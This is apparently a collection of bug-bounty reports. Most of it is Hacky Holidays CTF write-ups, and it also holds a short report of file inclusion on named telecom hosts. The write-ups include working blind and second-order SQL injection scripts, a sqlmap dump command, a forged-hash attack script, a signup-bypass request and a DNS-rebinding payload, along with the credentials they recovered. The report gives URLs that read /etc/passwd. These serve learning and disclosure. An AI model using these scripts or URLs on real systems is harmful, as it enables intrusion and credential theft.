As phpmyadmin usually accepts database credentials, it was no big surprise that it is possible login to phpmyadmin with forum:6HgeAZ0qC9T6CQIqJpD.
The forum database is accessible, but we can only read the user table, when clicking on comment, post or section, only a message Error reading database encoding... was shown.
The user table contained the following entries:
Code 117 Bytes
1id 	username 	password 	admin
21 	grinch 	35D652126CA1706B59DB02C93E0C9FBF 	1
32 	max 	388E015BC43980947FCE0E5DB16481D1
We need to be admin to read the entries in the admin section therefore we need to get grinch's plaintext password.
The password looks like MD5. Luckily I was lazy enough to first search if the hashes were already cracked by googling them. max hash gave me no result, but I found out that BahHumbug is the plaintext password of the user grinch.
<image_15>
Not even rockyou.txt contains the hash, it would have taken me forever to crack the hash on my own. Due to that, I'm still not sure if I missed a step that would have allowed to bypass the login by reviewing the forum sourcecode - looking shortly through it did not reveal any obvious bugs. On the other hand, if bruteforcing the password with a wordlist was possible, the phpmyadmin step could be bypassed altogether, maybe a hash that usually is not present in a common wordlist was used intentionally...
Anyway, I successfully used grinch:BahHumbug to login to the forum and was able read the post in the admin area under the category Secret Plans which contains the flag, flag{677db3a0-f9e9-4e7e-9ad7-a9f23e47db8b}:
<image_16>
Flag 9 - Evil Quiz
App description: "Just how evil are you? Take the quiz and see! Just don't go poking around the admin area!"
The grinch wants us to take a quiz. In order to complete a quiz, one must specify a username and answer the following 3 questions:
Do you like Christmas?
Are you holly and jolly?
Do you like presents?
After submitting the quiz, a score is printed and the number of other players with the same name gets shown.
After trying some input manipulation, I found out that the name input at the beginning of the quiz is vulnerable to SQL injection and we can see the result of a boolean query by analyzing the number of players displayed at the end of the game: when using invalidplayername' or if(1=0, 1, 0); -- as username, zero players are selected from the database, therefore the count of other players equals zero, whereas when adding invalidplayername' or if(1=0, 1, 0); -- , all players are selected and the count is greater than zero.
Unfortunately, we need to submit multiple requests to get a result. Instead of trying to find out how to use SQLMap for that task / whether that is possible at all, I used the following Python script for getting the credentials:
Code 3.51 KiB
1import re
2import requests
3import string
4from urllib3.exceptions import InsecureRequestWarning
5
6# Suppress only the single warning from urllib3 needed.
7requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
8
9RHOST = "https://hackyholidays.h1ctf.com"
10# proxies = { "http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080" }
11proxies = {}
12
13def get_quiz(s):
14    s.get(f"{RHOST}/evil-quiz")
15
16def post_quiz(s, payload):
17    data = { "name": payload }
18    s.post(f"{RHOST}/evil-quiz", data=data)
19
20def post_start(s):
21    data = { "ques_1": 0, "ques_2": 0, "ques_3": 0 }
22    res = s.post(f"{RHOST}/evil-quiz/start", data=data)
23    m = re.search(".*There is ([0-9]+) other player\(s\) with the same name as you!.*", res.text, re.DOTALL)
24    if m:
25        return m.group(1)
26
27def submit_try(s, payload):
28    post_quiz(s, payload)
29    return post_start(s)
30
31def exploit(s, query):
32    alphabet = string.printable
33    resume = True
34    result = ""
35    position = 1
36    while resume:
37        resume = False
38        for c in alphabet:
39            candidate = ord(c)
40            payload = f"sdfasdfgdsfgx' or substring(binary({query}), {position}, 1) = char({candidate}); -- "
41            if int(submit_try(s, payload)) > 0:
42                result += c
43                print(f"[+] Found: {result}")
44                position += 1
45                resume = True
46                break
47    return result
48
49
50
51if __name__ == "__main__":
52    s = requests.Session()
53    s.proxies.update(proxies)
54    s.verify = False
55    get_quiz(s)
56
57    # initial pocs
58    # print(submit_try(s, "sdfasdfgdsfg' or if(1=1, 1, 0); -- "))
59    # print(submit_try(s, "sdfasdfgdsfg' or if(1=0, 1, 0); -- "))
60
61    # there is only 1 table schema of interest -> schema name: quiz
62    # print(submit_try(s, "sdfasdfgdsfg' or (select count(schema_name) from information_schema.schemata where schema_name <> 'information_schema') = 1; -- "))
63    # result = exploit(s, "select schema_name from information_schema.schemata where schema_name <> 'information_schema'")
64    # print(result)
65
66    # there are 2 tables in schema quiz: admin, quiz
67    # print(submit_try(s, "sdfasdfgdsfg' or (select count(table_name) from information_schema.tables where table_schema = 'quiz') = 2; -- "))
68    # result = exploit(s, "select table_name from information_schema.tables where table_schema = 'quiz' limit 1")
69    # result = exploit(s, "select table_name from information_schema.tables where table_schema = 'quiz' limit 1 offset 1")
70
71    # there are 3 columns in table admin: id, password, username
72    # print(submit_try(s, "sdfasdfgdsfg' or (select count(column_name) from information_schema.columns where table_schema = 'quiz' and table_name = 'admin') = 3; -- "))
73    # result = exploit(s, "select column_name from information_schema.columns where table_schema = 'quiz' and table_name = 'admin' limit 1")
74    # result = exploit(s, "select column_name from information_schema.columns where table_schema = 'quiz' and table_name = 'admin' limit 1 offset 1")
75    # result = exploit(s, "select column_name from information_schema.columns where table_schema = 'quiz' and table_name = 'admin' limit 1 offset 2")
76
77    # there is 1 entry in table admin: id: 1, username: admin, password: S3creT_p4ssw0rd-$
78    # print(submit_try(s, "sdfasdfgdsfg' or (select count(*) from admin) = 1; -- "))
79    print(submit_try(s, "sdfasdfgdsfg' or (select id from admin) = 1; -- "))
80    result = exploit(s, "select username from admin")
81    print("Username: " + result)
82    result = exploit(s, "select password from admin")
83    print("Password: " + result)
After getting the credentials (which took quite a while), I was able to login with admin:S3creT_p4ssw0rd-$ and get the flag, flag{6e8a2df4-5b14-400f-a85a-08a260b59135}:
<image_17>
Flag 10 - Signup Manager
App description: "You've made it this far! The grinch is recruiting for his army to ruin the holidays but they're very picky on who they let in!"
When visiting https://hackyholidays.h1ctf.com/signup-manager and looking through the HTML source, there is a reference to README.md:
Code 37 Bytes
1<!-- See README.md for assistance -->
README.md can be found under https://hackyholidays.h1ctf.com/signup-manager and tells us default credentials (admin:password) that do not work and that a zip archive named signupmanager.zip must be unzipped in order to deploy the application.
Code 712 Bytes
1# SignUp Manager
2
3SignUp manager is a simple and easy to use script which allows new users to signup and login to a private page. All users are stored in a file so need for a complicated database setup.
4
5### How to Install
6
71) Create a directory that you wish SignUp Manager to be installed into
8
92) Move signupmanager.zip into the new directory and unzip it.
10
113) For security move users.txt into a directory that cannot be read from website visitors
12
134) Update index.php with the location of your users.txt file
14
155) Edit the user and admin php files to display your hidden content
16
176) You can make anyone an admin by changing the last character in the users.txt file to a Y
18
197) Default login is admin / password
Luckily, someone forgot to remove the zip archive from the server after unpacking it, therefore we can download it from https://hackyholidays.h1ctf.com/signup-manager/signupmanager.zip. The zip archive contains the sourcecode of signup manager page. The logic seems to happen in index.php.
Of course, https://hackyholidays.h1ctf.com/signup-manager/users.txt was not found. According to the README, the users.txt was probably placed into an inaccessible directory.
To further analyze the behaviour of the application, I unpacked the zip archive and started a local PHP development server from the directory containing hte unpacked files with php -S 0.0.0.0:8000.
Signing up at my local test server e.g. causes the following line to be written into users.txt:
Code 113 Bytes
1myusername#####34819d7beeabb9260a5c854bc85b3e444e6fce8107c28f716a911683586ccf6d18#MyFirstName####MyLastName#####N
A user entry equals a line of 112 chars in that file plus Y at the end if it is an admin user, else N. When signing up for an account, N is appended at the end, therefore, all users added via signup are non-admins.
According to the source code, each field has a certain length. If a string submitted by the user is shorter, the value is padded with # using the pad_str function.
By looking at the source code again, I noticed that additional characters are stripped from a line immediately before it is written to users.txt:
Code 531 Bytes
1function addUser($username,$password,$age,$firstname,$lastname){
2    $random_hash = md5( print_r($_SERVER,true).print_r($_POST,true).date("U").microtime().rand() );
3    $line = '';
4    $line .= str_pad( $username,15,"#");
5    $line .= $password;
6    $line .= $random_hash;
7    $line .= str_pad( $age,3,"#");
8    $line .= str_pad( $firstname,15,"#");
9    $line .= str_pad( $lastname,15,"#");
10    $line .= 'N';
11    $line = substr($line,0,113);
12    file_put_contents('users.txt',$line.PHP_EOL, FILE_APPEND);
13    return $random_hash;
14}
This means that if we somehow manage to construct a string that is at least 1 character longer than expected, we can create a valid entry for an admin user by placing Y at position 113, e.g. by using the lastname parameter where we can freely choose the content as long as it is alphanumeric and exactly 15 characters long.
Fortunately, str_pad does not strip strings longer than the expected length but instead keeps the whole string. This means we need to find a field where we can insert a string that is longer than expected.
The parameters username, firstname and lastname have a minimum length of 3 characters and are filtered through substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["<VALUE>"]), 0, 15) before being padded, this makes using multibytes to cause inconsistencies in the string length impossible. The password parameter is stored as md5 value and therefore has a fixed length, however, no check is being performed before passing the POST parameter form user input into password = md5($_POST["password"]). When using an array instead of a string, signing up succeeds with a PHP warning (PHP Warning: md5() expects parameter 1 to be string, array given in /[SNIP]/index.php on line 76) but no password hash is added to the final entry in users.txt because the md5() function just returns an empty string. Unfortunately, a shorter string in users.txt does not help because it gets filtered out when getting a list of users from users.txt during login, only entries with exactly 113 characters are considered valid.
This only leaves the age parameter for bypassing the length. The age parameter is checked as follows before passing it to add_user:
Code 278 Bytes
1if (!is_numeric($_POST["age"])) {
2	$errors[] = 'Age entered is invalid';
3}
4if (strlen($_POST["age"]) > 3) {
5	$errors[] = 'Age entered is too long';
6}
7$age = intval($_POST["age"]);
8if (count($errors) === 0) {
9	$cookie = addUser($username, $password, $age, $firstname, $lastname);
The is_numeric check assures that age is numeric, which rules out multibyte attacks again. However, it is not only possible to enter decimal values, is_numeric also accepts other representation of numbers.
After some trial and error, I found out that there is an inconsistency regarding the length in strlen() vs intval() when using numbers in scientific notation: intval(1e3) equals 1000 which is of length 4, but strlen(1e3) is 3:
Code 135 Bytes
1$ php -A
2php > $x = "1e3"; echo is_numeric($x) . " " . strlen($x) . " " . intval($x) . " " . str_pad(intval($x), 3, "#");
31 3 1000 1000
This allows us to make the user entry 1 character longer than expected. The final N is cut off before adding this entry to users.txt, therefore an admin user can be created by adding Y as the very last character of the line which is the last character of a 15 character long lastname parameter.
The following request creates an admin user:
Code 241 Bytes
1POST /signup-manager/ HTTP/1.1
2Host: hackyholidays.h1ctf.com
3Content-Type: application/x-www-form-urlencoded
4Content-Length: 94
5Connection: close
6
7action=signup&username=lumi&password=nougatzzz&age=1e3&firstname=lumi&lastname=AAAAAAAAAAAAAAY
When logging in with lumi:nougatzzz, admin.php gets included in the page which contains the flag, flag{99309f0f-1752-44a5-af1e-a03e4150757d}, as well as a link to the 11th challenge:
<image_18>
Flag 11 - Recon Server
Using the link from the 10th challenge, it is possible to access the recon server challenge under https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59.
<image_19>
What struck my attention first were the requests that load images, e.g.:
Code 255 Bytes
1GET /r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLzliODgxYWY4YjMyZmYwN2Y2ZGFhZGE5NWZmNzBkYzNhLmpwZyIsImF1dGgiOiJlOTM0ZjQ0MDdhOWRmOWZkMjcyY2RiOWMzOTdmNjczZiJ9 HTTP/1.1
2Host: hackyholidays.h1ctf.com
3Connection: close
When base64 decoding the data parameter, one can see that it contains a JSON object (as expected when looking at the first few characters of the base64 string):
Code 120 Bytes
1{"image":"r3c0n_server_4fdk59\/uploads\/9b881af8b32ff07f6daada95ff70dc3a.jpg","auth":"e934f4407a9df9fd272cdb9c397f673f"}
I immediately thought of some sort of SSRF / local file inclusion but the content of the image parameter was protected by the auth value, which looks like a hash. When changing the image parameter to something else, the error message invalid authentication hash gets returned. After trying to crack the hash I came to the conclusion that it is possibly server-generated.
Next, I tried to find the API which was mentioned on the challenge site. It was pretty straightforward to find the API's base URL under https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/api:
<image_20>
I thought that it was weird that so many different and very specific status codes were explained here. When trying to find endpoints under /r3c0n_server_4fdk59/api/*, I had no success at all, the only thing I got back from the server was the message {"error":"This endpoint cannot be visited from this IP address"}.
Well, that sounds like SSRF again... After trying to play with the Host header and X-Forwarded-For,... without success, I again looked at the requests I got in Burp. Finally, I found out that SQL injection was possible in the hash parameter when loading an album:
After finding out that it is possible to use union and how many fields to add for getting the same number of columns than the original query, I finally even got output: When using 5' union all select '0',0,'albumtitle' -- - as payload in the hash parameter, albumtitle was used as title of the album, and no entries were shown. However, when using an existing album ID as first field in the union query, e.g. 0'+union+all+select+'1',0,'albumtitle'+--+-, the two image links from that category showed up.
It was time to get some more information about the database structure. Because the SQL injection could be performedd by using a single request, I used sqlmap for dumping the database schema as follows:
Code 88 Bytes
1$ sqlmap -u https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k --dump
The following entries were found:
Code 848 Bytes
1Database: recon
2Table: photo
3[6 entries]
4+----+----------+--------------------------------------+
5| id | album_id | photo                                |
6+----+----------+--------------------------------------+
7| 1  | 1        | 0a382c6177b04386e1a45ceeaa812e4e.jpg |
8| 2  | 1        | 1254314b8292b8f790862d63fa5dce8f.jpg |
9| 3  | 2        | 32febb19572b12435a6a390c08e8d3da.jpg |
10| 4  | 3        | db507bdb186d33a719eb045603020cec.jpg |
11| 5  | 3        | 9b881af8b32ff07f6daada95ff70dc3a.jpg |
12| 6  | 3        | 13d74554c30e1069714a5a9edda8c94d.jpg |
13+----+----------+--------------------------------------+
14
15Database: recon
16Table: album
17[3 entries]
18+----+--------+-----------+
19| id | hash   | name      |
20+----+--------+-----------+
21| 1  | 3dir42 | Xmas 2018 |
22| 2  | 59grop | Xmas 2019 |
23| 3  | jdh34k | Xmas 2020 |
24+----+--------+-----------+
This only shows us data we already know and still does not help us accessing arbitrary API endpoints...
After some more thinking I had the idea to inject SQL into the SQL query and hope that the application is vulnerable to second-order sql injection. This worked indeed - I used the following proof-of concept payload for producing a single image link:
Code 87 Bytes
10' UNION ALL SELECT '0\' union all select 1,\'hash\',\'../api\' -- ',1,'albumtitle'-- -
JSON-decoding the image link's data parameter confirms that it is possible to inject into the URL:
Code 91 Bytes
1{"image":"r3c0n_server_4fdk59\/uploads\/..\/api","auth":"38122d477657c1a0c9ba873c11017497"}
As the auth parameter is server-generated, it is valid, which can be confirmed by opening the image link:
Code 410 Bytes
1GET /r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGkiLCJhdXRoIjoiMzgxMjJkNDc3NjU3YzFhMGM5YmE4NzNjMTEwMTc0OTcifQ== HTTP/1.1
2Host: hackyholidays.h1ctf.com
3Connection: close
4
5
6HTTP/1.1 200 OK
7Server: nginx/1.18.0 (Ubuntu)
8Date: Thu, 31 Dec 2020 02:05:21 GMT
9Content-Type: text/html; charset=UTF-8
10Connection: close
11Content-Length: 29
12
13Invalid content type detected
This returns an error message about the content type (probably because an image is expected), but shows that the injection can possibly be used for querying the API. Great!
I wrote a Python script for finding API endpoints and found out that there seems a valid endpoint under /r3c0n_server_4fdk59/api/user. However when trying to access it, I got the error message Invalid content type detected again!
After being stuck for a bit, I found out that the endpoint accepts the GET parameters username and password as well. Not sure if they were totally vulnerable to SQLI again, but it was possible to query username and password character by character by using % as a wildcard, because whenever the query got results, the error message Invalid content type detected was returned.
The following script was used to find the API endpoints and retrieve valid credentials:
Code 2.95 KiB
1import re
2import requests
3import string
4
5from urllib3.exceptions import InsecureRequestWarning
6
7# Suppress only the single warning from urllib3 needed.
8requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
9
10BASE_URL = "https://hackyholidays.h1ctf.com"
11
12# proxies = { "http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080" }
13proxies = {}
14
15def get_hash(s, payload):
16    params = { "hash": f"0' UNION ALL SELECT '0\\' union all select 1,\\'hash\\',\\'{payload}\\' -- ',1,'albumtitle'-- -" }
17    res = s.post(BASE_URL + "/r3c0n_server_4fdk59/album", params=params)
18    m = re.search(".*<img class=\"img-responsive\" src=\"([^\"]+)\">.*", res.text, re.DOTALL)
19    if m:
20        return m.group(1)
21
22
23def get_picture(s, url):
24    res = s.get(BASE_URL + str(url))
25    return res.text
26
27
28def submit_try(s, payload):
29    url = get_hash(s, payload)
30    return get_picture(s, url)
31
32
33def retrieve_username(s):
34    result = ""
35    alphabet = string.ascii_lowercase + string.digits
36    resume = True
37    while resume:
38        for char in alphabet:
39            if "Invalid content type detected" in submit_try(s, f"../api/user?username={result}{char}%"):
40                result += char
41                print(f"[+] Found: {result}")
42                if "Invalid content type detected" in submit_try(s, f"../api/user?username={result}"):
43                    resume = False
44    return result
45
46
47def retrieve_password(s, username):
48    result = ""
49    alphabet = string.ascii_letters + string.digits
50    resume = True
51    while resume:
52        for char in alphabet:
53            if "Invalid content type detected" in submit_try(s, f"../api/user?username={username}&password={result}{char}%"):
54                result += char
55                print(f"[+] Found: {result}")
56                if "Invalid content type detected" in submit_try(s, f"../api/user?username={username}&password={result}"):
57                    resume = False
58    return result
59
60def discover_endpoints(s, payload, normal_errormsg):
61    content = []
62    with open("/usr/share/seclists/Discovery/Web-Content/api/objects-lowercase.txt") as f:
63        for line in f:
64            fuzz = line.strip()
65            url = get_hash(s, payload.format(fuzz=fuzz))
66            res_text = get_picture(s, url)
67            if normal_errormsg not in res_text:
68                print(f"[+] {fuzz} -> {res_text}")
69                content.append(fuzz)
70            else:
71                print(f"[-] {fuzz} -> {res_text}")
72    return content
73
74
75if __name__ == "__main__":
76    s = requests.Session()
77    s.proxies.update(proxies)
78    s.verify = False
79
80    routes = discover_endpoints(s, "../api/{fuzz}", "Expected HTTP status 200, Received: 404")
81    print(f"FOUND: {routes}")
82
83    params = discover_endpoints(s, "../api/user?{fuzz}=x", "Expected HTTP status 200, Received: 400")
84    print(f"FOUND: {params}")
85
86    username = retrieve_username(s)
87    print(f"[+] Username: {username}")
88
89    password = retrieve_password(s, username)
90    print(f"[+] Password: {password}")
91
Finally, it was possible to login under Attack Box with the credentials grinchadmin:s4nt4sucks and get the flag, flag{07a03135-9778-4dee-a83c-7ec330728e72}:
<image_21>
Flag 12 - Attack Box
As shown above, a list of santa's key servers is listed on the attack-box, and attacks can be launched directly from there. When clicking on the attack button, a web terminal opens, showing that host information is gathered and a DDOS attack is launched. After the "attack", a ping is made to the host to see it if is still up.
Of course, we do not attack santa but the grinch himself, it is quite logical that we need to attack localhost in some way.
When clicking on Attack besides an IP address, a GET request is submitted to https://hackyholidays.h1ctf.com/attack-box/launch with a parameter payload and a value that looks like base64-encoded JSON once again.
Decoding such a payload gives the following result:
Code 67 Bytes
1{"target":"203.0.113.33","hash":"5f2940d65ca4140cc18d0878bc398955"}
Once again, the target parameter is protected by a hash, however, this time I could not find any possibility to make the server generate the hash for me. When trying to change the payload, the message Invalid Protection Hash is shown which confirms that the hash gets checked for sure, except when using any characters other than alphanumeric, dot and slash in the target value - in this case, the input validation fails immediately with Invalid characters detected in the target.
After finding the hint at https://twitter.com/Hacker0x01/status/1342545650789978112, I assumed that some salt is used to generate the hash. The length of the hash indicates that it is probably md5, hopefully the salt is either appended or prepended to the payload...
Using Hydra for cracking the salt succeeded and I found out that mrgrinch463 is appended to the payload before calculating the MD5 hash of the payload.
This allows generating valid hashes for arbitrary payloads and thus launch attacks against arbitrary targets - nice!
However, this turned out to the the easier step - I tried a bunch of payloads without success, e.g. possible contents of /etc/hosts that reference localhost and localhost IPs (localhost, 127.0.0.1,127.0.1.1, attackbox.local, attackbox, ip6-localhost, ip6-loopback), different bypasses for making a ping to localhost without using localhost or 127.0.0.1 (127.1, 127.0.1, 127.000.000.001), IPv6 addresses (::1, ipv6.localtest.me), hackyholidays.h1ctf.com, the external IP / A record of hackyholidays.h1ctf.com (18.216.153.32), the AWS hostname found with ipinfo (ec2-18-216-153-32.us-east-2.compute.amazonaws.com"), the internal 172 ip that was disclosed when pinging the AWS hostname from the attack box (172.31.15.248), broadcast addresses, my own VPS, Burp Collaborator hostnames,...
I used the following Python script for issuing manipulated requests:
Code 1.48 KiB
1import requests
2import json
3import base64
4import hashlib
5import re
6import time
7import string
8
9from urllib3.exceptions import InsecureRequestWarning
10
11# Suppress only the single warning from urllib3 needed.
12requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
13
14BASE_URL = "https://hackyholidays.h1ctf.com"
15
16# proxies = { "http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080" }
17proxies = {}
18
19def generate_hash(host):
20    data = "mrgrinch463" + ("Array" if type(host) != str else host)
21    return hashlib.md5(data.encode()).hexdigest()
22
23def submit_attack(s, host):
24    data = {"target": host,"hash": generate_hash(host) }
25    b64payload = base64.b64encode(json.dumps(data).encode()).decode()
26    params = { "payload" : b64payload }
27    res = s.get(BASE_URL + "/attack-box/launch", params=params)
28    m = re.search(".*getJSON\('([^']+)'.*", res.text, re.DOTALL)
29    print(m)
30    if m:
31        return m.group(1)
32    else:
33        print(res.status_code, res.text)
34
35def get_json(s, url, query_id):
36    print(f"URL: {BASE_URL}{url}".replace(".json", ""))
37    res = s.get(BASE_URL + url + str(query_id))
38    print(res.status_code, res.text)
39
40
41if __name__ == "__main__":
42    s = requests.Session()
43    s.proxies.update(proxies)
44    requests.utils.add_dict_to_cookiejar(s.cookies, {"attackbox": "d09d508e78f3975e0199a5e91dde9687"})
45    s.verify = False
46
47    host = "<PAYLOAD>"
48    print(f"[+] Attacking {host}...")
49    url = submit_attack(s, host)
50    if url:
51        get_json(s, url, "0")
I could observe that invalid IPs are either not accepted at all or, if they resolve to localhost, the attack gets blocked. IPv6 addresses do not work at all. All external IPs are blocked if they reference localhost or the external IP of the server. My own VPS was not hit by ping requests, probably I would have seen incoming DNS requests on my burp collaborator client but the identifiers were 1 character too long to work, therefore I just got Internal Server Error when trying to cause such requests.
After nearly giving up, I found out about DNS rebinding. It sounded promising, as there was basically no other option left except of resolving to a different hostname during the initial host checks and afterwards switching to localhost.
I used http://1u.ms/. After adjusting the payload to the 15 seconds delay, the payload make-1.1.1.1-rebindfor15s-127.0.0.1-rr.1u.ms worked and I finally got the last flag, flag{ba6586b0-e482-41e6-9a68-caf9941b48a0}:
<image_22>
Impact
.



==================================================

Report File: 1069105.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- Remote File Inclusion

Contents:

Summary:
2x Remote file inclusion within your VMware Instances
Hosts:
nmc.vc.mtn.co.ug
h28a.n1.ips.mtn.co.ug
Steps To Reproduce:
Navigate to the URLs given below, /etc/passwd will be displayed.
https://nmc.vc.mtn.co.ug/eam/vib?id=/etc/passwd
https://h28a.n1.ips.mtn.co.ug/eam/vib?id=/etc/passwd
Impact
An attacker is able to view sensitive files on the server hosting this content and could potentially elevate this to a remote code execution.



==================================================

Report File: 1069171.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- Information Disclosure

Contents:

Hello team,
Here is my CTF writeup for HackyHolidays.
Main page
The main page doesn't contain any interesting stuff, just a few assets. Maybe we will find some known files in webapp root: index.php, .htaccess, robots.txt, ...? robots.txt file exists, and there is the first flag:
Code 85 Bytes
1User-agent: *
2Disallow: /s3cr3t-ar3a
3Flag: flag{48104912-28b0-494a-9995-a203d1e261e7}
Also, there is a link to a hidden page /s3cr3t-ar3a. The source code of the page doesn't contain the flag, but it contains something interesting. First of all, there is div element with unused alert id (there are no css styles or scripts on the page where this id is used). Besides of this, jQuery library is loaded from the Grinch server, instead of public CDN (like as bootstrap css and js files):
https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css
https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js
/assets/js/jquery.min.js
Searching for the string alertbox in /assets/js/jquery.min.js gives us the following code:
Code 349 Bytes
1h1_0 = 'la',
2h1_1 = '}',
3h1_2 = '',
4h1_3 = 'f',
5h1_4 = 'g',
6h1_5 = '{b7ebcb75',
7h1_6 = '8454-',
8h1_7 = 'cfb9574459f7',
9h1_8 = '-9100-4f91-';
10document.getElementById('alertbox').setAttribute('data-info', h1_2 + h1_3 + h1_0 + h1_4 + h1_2 + h1_5 + h1_8 + h1_6 + h1_7 + h1_1);
11document.getElementById('alertbox').setAttribute('next-page', '/ap' + 'ps');
To get the flag, let's copy and run the code above in the browser console (will replace document.getElementById... to console.log(h1_2 + h1_3 + h1_0 + h1_4 + h1_2 + h1_5 + h1_8 + h1_6 + h1_7 + h1_1)).
Another way to get the second flag, open the browser inspector, and search for flag or select div#alertbox element. The flag will be in data-info attribute.
The 1st flag: flag{48104912-28b0-494a-9995-a203d1e261e7}.
The 2nd flag: flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}.
People Rater
This app allows us to see how Grinch rates (hates:)) people.
There are two endpoints:
/page/:pageId - returns the list of people
/entry?id=:id - returns details about selected man
The most interesting endpoint here is /entry, the id parameter value is a base64 encoded string. For the first man, Tea Avery, it's eyJpZCI6Mn0= and decoded value is {"id":2}. It looks interesting, why id for the first man starts from 2, instead of 1? Let's check what the server will return for man with id=1.
JSON: {"id":1}.
base64 encoded string: eyJpZCI6MX0=.
Send request: curl https://hackyholidays.h1ctf.com/people-rater/entry?id=eyJpZCI6MX0%3D.
The response will contain details about the Grinch's user and the flag:
Code 156 Bytes
1{
2    "id":"eyJpZCI6MX0=",
3    "name":"The Grinch",
4    "rating":"Amazing in every possible way!",
5    "flag":"flag{b705fb11-fb55-442f-847f-0931be82ed9a}"
6}
The 3rd flag: flag{b705fb11-fb55-442f-847f-0931be82ed9a}.
Swag Shop
There is a simple app with products, where we can purchase any product, but to do that we must be logged in.
The app has four known API endpoints (most of them we can find in inline javascript):
GET /api/stock - returns list of products
POST /api/purchase - buy a product, authentication required
POST /api/login - log in
GET /checkout - opens or redirects to the check page?
Let's try to find more (hidden) endpoints. To do that let's run gobuster tool in dir mode:
Code 99 Bytes
1$ gobuster dir -u https://hackyholidays.h1ctf.com/swag-shop/api -w raft-small-directories.txt -t 50
gobuster will find two new endpoints:
/user returns an error, if it's called without any parameter: {"error":"Missing required fields"}. Looks like it returns some information about a provided user.
/sessions returns JSON object with a list of strings encoded in base64:
Code 2.16 KiB
1{
2  "sessions": [
3"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJZelZtTlRKaVlUTmtPV0ZsWVRZMllqQTFaVFkxTkRCbE5tSTBZbVpqTW1ObVpHWXpNemcxTVdKa1pEY3lNelkwWlRGbFlqZG1ORFkzTkRrek56SXdNR05pWmpOaE1qUTNZMlJtWTJFMk4yRm1NemRqTTJJMFpXTmxaVFZrTTJWa056VTNNVFV3WWpka1l6a3lOV0k0WTJJM1pXWmlOamsyTjJOak9UazBNalU9In0=",
4"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJaak0yTXpOak0ySmtaR1V5TXpWbU1tWTJaamN4TmpkbE5ETm1aalF3WlRsbVkyUmhOall4TldNNVkyWTFaalkyT0RVM05qa3hNVFEyTnprMFptSXhPV1poTjJaaFpqZzBZMkU1TnprMU5UUTJNek16WlRjME1XSmxNelZoWkRBME1EVXdZbVEzTkRsbVpURTRNbU5rTWpNeE16VTBNV1JsTVRKaE5XWXpPR1E9In0=",
5"eyJ1c2VyIjoiQzdEQ0NFLTBFMERBQi1CMjAyMjYtRkM5MkVBLTFCOTA0MyIsImNvb2tpZSI6Ik5EVTBPREk1TW1ZM1pEWTJNalJpTVdFME1tWTNOR1F4TVdFME9ETXhNemcyTUdFMVlXUmhNVGMwWWpoa1lXRTNNelUxTWpaak5EZzVNRFEyWTJKaFlqWTNZVEZoWTJRM1lqQm1ZVGs0TjJRNVpXUTVNV1E1T1dGa05XRTJNakl5Wm1aak16WmpNRFEzT0RrNVptSTRaalpqT1dVME9HSmhNakl3Tm1Wa01UWT0ifQ=="
6"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNRFJtWVRCaE4yRmlOalk1TUdGbE9XRm1ZVEU0WmpFMk4ySmpabVl6WldKa09UUmxPR1l3TWpJMU9HSXlOak0xT0RVME5qYzJZVGRsWlRNNE16RmlNMkkxTVRVek16VmlNakZoWXpWa01UYzRPREUzT0dNNFkySmxPVGs0TWpKbE1ESTJZalF6WkRReE1HTm1OVGcxT0RReFpqQm1PREJtWldReFptRTFZbUU9In0=",
7"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNMlEyTURJek5EZzVNV0UwTjJNM05ESm1OVEl5TkdNM05XVXhZV1EwTkRSbFpXSTNNVGc0TWpJM1pHUmtNVGxsWlRNMlpEa3hNR1ZsTldFd05tWmlaV0ZrWmpaaE9EZzRNRFkzT0RsbVpHUmhZVE0xWTJJeU1HVmhNakExTmpkaU5ERmpZekJoTVdRNE5EVTFNRGM0TkRFMVltSTVZVEpqT0RCa01qRm1OMlk9In0=",
8"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNV1kzTVRBek1UQmpaR1k0WkdNd1lqSTNaamsyWm1Zek1XSmxNV0V5WlRnMVl6RTBNbVpsWmpNd1ltSmpabVE0WlRVMFkyWXhZelZtWlRNMU4yUTFPRFkyWWpGa1ptRmlObUk1WmpJMU0yTTJNRFZpTmpBMFpqRmpORFZrTlRRNE4yVTJPRGRpTlRKbE1tRmlNVEV4T0RBNE1qVTJNemt4WldOaE5qRmtObVU9In0=",
9"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNRE00WXpoaU4yUTNNbVkwWWpVMk0yRmtabUZsTkRNd01USTVNakV5T0RobE5HRmtNbUk1T1RjeU1EbGtOVEpoWlRjNFlqVXhaakl6TjJRNE5tUmpOamcyTm1VMU16VmxPV0V6T1RFNU5XWXlPVGN3Tm1KbFpESXlORGd5TVRBNVpEQTFPVGxpTVRZeU5EY3pOakZrWm1VME1UZ3hZV0V3TURVMVpXTmhOelE9In0=",
